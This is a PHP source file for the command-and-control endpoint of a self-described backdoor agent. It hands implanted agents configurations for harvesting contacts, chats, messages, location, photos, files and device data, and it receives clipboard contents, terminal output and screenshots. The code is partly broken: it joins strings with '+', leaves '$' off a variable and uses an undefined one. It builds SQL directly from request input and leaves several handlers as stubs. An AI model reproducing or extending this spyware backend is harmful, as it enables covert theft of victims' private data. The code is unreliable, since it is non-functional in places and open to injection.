<?php

/** Parse url from backdoor agent and return configurations if asked **/

$parts = parse_url($url);
parse_str($parts['query'], $query_params);

$task = $query_params['task'];
if (!empty($task)) {
	// Create a connection to DB
	$servername = "localhost";
	$username = "username";
	$password = "password";
	$dbname = "myDB";

	// Create connection
	$conn = mysqli_connect($servername, $username, $password, $dbname);
	// Check connection
	if (!$conn) {
		die("Connection failed: " . mysqli_connect_error());
	}

	if ($task == 'getConfigurations') {
	$social = [];

	/* if ($query_params['agent'] == 'scout') {
		$social = ["addressbook" => 0, "chat" => 0, "messages" => 0, "position" => 0, "photo" => 0, "file" => 0, "device" => 0];
	}
	else if ($query_params['agent'] == 'soldier') {
		$social = ["addressbook" => 1, "chat" => 0, "messages" => 1, "position" => 1, "photo" => 1, "file" => 0, "device" => 1];
	}
	else */ if ($query_params['agent'] == 'zeus') {
		$social = ["addressbook" => 1, "chat" => 1, "messages" => 1, "position" => 1, "photo" => 1, "file" => 1, "device" => 1];
	}

	$data = ['screenshoot' => 1, 'social' => $social, 'deviceInfo' => 1];

	header('Content-Type: application/json');
	echo json_encode($data);
	}
	else if ($task == 'setConfigurations') {
		$newConfigurations = $query_params['data'];
		// Save to DB
	}
	else if ($task == 'clipboard') {
		$clipboardData = $query_params['data'];
		// Save to DB
	}
	else if ($task == 'deviceInfo') {
		$deviceInfo = $query_params['data'];
		
		// Device info paeams
		$param1 = $deviceInfo['key1'];
		$param2 = $deviceInfo['key2'];
		$param2 = $deviceInfo['key3'];

		$sql = "INSERT INTO DeviceInfo (" + $deviceInfo['key1'] + ", " + $deviceInfo['key2'] + ", " + $deviceInfo['key3'] + ") VALUES (" + $param1 + ", " + $param2 + ", " + $param3 + ")";
		queryResults = performSqlQuery($conn, $sql);
		echo "queryResults: " + queryResults;
	}
	else if ($task == 'terminal') {
		$terminalOutput = $query_params['data'];
		// Save to DB
	}
	else if ($task == 'screenshot') {
		$base64Image = $query_params['data'];
		$base64Image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $base64Image));
		file_put_contents('/screenshots/image.png', $base64Image);
	}

	mysqli_close($conn); // Close connection to DB
}

function performSqlQuery($dbConnection, $sqlQuery) {
	if (mysqli_query($dbConnection, $sqlQuery)) {
		return "New record created successfully";
	}
	else {
		return "Error: " . $sqlQuery . "<br>" . mysqli_error($dbConnection);
	}
}

function buildSqlQueryFromDictionary($dataDictionary, $tableName) {
	//
}

?>